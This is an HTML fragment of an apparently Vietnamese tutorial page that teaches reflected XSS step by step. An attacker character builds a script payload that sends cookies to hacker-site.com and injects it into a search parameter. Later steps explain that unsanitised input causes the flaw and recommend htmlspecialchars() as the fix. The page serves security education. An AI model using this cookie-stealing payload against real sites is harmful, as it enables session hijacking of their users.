      ...
      <div class="container-fluid">
        ...
        <div class="barRight">
          ...
          <div class="content">
            ...
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">5</span>Bobby bắt đầu tấn công người dùng. Bobby có một trang web server của riêng hắn là <a href="http://acttacker.rf.gd" target="_blank" class="mark">acttacker.rf.gd</a>
                </p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">6</span>Bobby tạo link chứa script như sau<br>
                ...
                &ltscript&gtnewImage().src=http:/hacker-site.com /XSS/get.php?cookie=+cookie;&ltscript&gt<br>
            ...
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
              <p class="document"><span class="step">7</span>Bobby chèn mã trên vào param "search": localhost/?search=&ltscript&gtnewImage().src=http:/hacker-site.com /XSS/get.php?cookie=+cookie;&ltscript&gt
                </p>
            </div>
            <div class="guide">
              <img class="symbol" src="images/attacker.png">
            ...
            <div class="guide">
              <img class="symbol" src="images/user.png">
              <p class="document"><span class="step">12</span>Vậy làm sao ta khắc phục được reflected XSS?<br>
                Đơn giản, Hãy xóa thanh tìm kiếm<br>
                Không, Tôi đùa đó😊<br>
                Như đã nói ở bước 4: Biến keywork nhận giá trị bất kì và rồi truyền lên server xử lý. Nhưng server đã không kiểm soát giá trị đầu vào này trước khi trả về cho trình duyệt dẫn đến mã javascript bị chèn vào trong source code.
                </p>
            ...
            <div class="guide">
              <img class="symbol" src="images/user.png">
              <p class="document"><span class="step">13</span>Vậy ta sẽ kiểm soát giá trị đầu vào bằng cách sử dụng hàm htmlspecialchars() sẽ giúp thay thế các kí tự Dạng ứng dụng, ví dụ: “<“<br> thành Dạng thực thể (html Entities), ví dụ “&amp;lt;”<br>
